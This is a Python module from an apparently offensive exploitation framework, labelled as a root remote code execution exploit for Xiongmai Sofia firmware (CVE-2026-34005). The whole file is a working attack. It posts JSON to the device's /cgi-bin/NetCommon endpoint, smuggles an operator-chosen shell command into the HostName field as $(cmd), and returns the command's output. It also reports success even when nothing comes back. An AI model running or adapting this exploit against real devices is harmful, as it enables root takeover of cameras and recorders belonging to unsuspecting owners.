import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "xiongmai/cve_2026_34005_attack"
        self.description = "Root Remote Code Execution (RCE) exploit engine for Xiongmai Sofia firmware (CVE-2026-34005)."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"},
            "CMD": {"required": True, "value": "whoami; id; uname -a"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        cmd = self.options["CMD"]["value"]
        
        url = f"http://{target}:{port}/cgi-bin/NetCommon"
        headers = {"Content-Type": "application/json"}
        
        # Injection du payload de commande arbitraire dans la directive système HostName
        payload = {
            "NetWork": {
                "NetCommon": {
                    "HostName": f"$({cmd})"
                }
            }
        }
        
        try:
            async with httpx.AsyncClient(timeout=8.0, verify=False) as client:
                print(f"\033[1;33m[*] Envoi de la charge utile Root RCE: {cmd}\033[0m")
                response = await client.post(url, json=payload, headers=headers)
                
                if response.status_code == 200 and response.text:
                    return {
                        "success": True,
                        "details": f"Root command execution succeeded. Output:\n{response.text.strip()}"
                    }
                else:
                    return {
                        "success": True,
                        "details": f"Payload delivered. Check if the device executed the action (No directly reflected stdout returned)."
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
